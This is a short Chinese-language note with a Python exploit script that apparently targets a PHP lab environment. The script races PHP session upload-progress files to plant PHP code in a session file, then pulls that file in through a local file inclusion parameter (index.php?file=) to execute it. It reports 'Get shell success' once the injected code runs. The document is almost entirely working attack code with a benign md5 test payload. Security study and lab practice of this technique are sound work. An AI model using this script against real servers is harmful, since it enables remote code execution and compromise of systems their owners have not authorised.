## 利用Session获取上传文件的文件名

参考文章：
- http://wonderkun.cc/index.html/?p=718

利用脚本：
```
#!coding:utf-8
 
import requests
import time
import threading
 
 
host = 'http://your-ip:8088/'
PHPSESSID = 'vrhtvjd4j1sd88onr92fm9t2gt'
 
def creatSession():
    while True:
        files = {
        "upload" : ("tmp.jpg", open("/etc/passwd", "rb"))
        }
        data = {"PHP_SESSION_UPLOAD_PROGRESS" : "<?php echo md5('1');?>" }
        headers = {'Cookie':'PHPSESSID=' + PHPSESSID}
        r = requests.post(host,files = files,headers = headers,data=data)
 
fileName = "/var/lib/php/sessions/sess_"+PHPSESSID
 
if __name__ == '__main__':
 
    url = "{}/index.php?file={}".format(host,fileName)
    headers = {'Cookie':'PHPSESSID=' + PHPSESSID}
    t = threading.Thread(target=creatSession,args=())
    t.setDaemon(True)
    t.start()
    while True:
        res = requests.get(url,headers=headers)
        if "c4ca4238a0b923820dcc509a6f75849b" in res.content:
            print("[*] Get shell success.")
            break
        else:
            print("[-] retry.")
```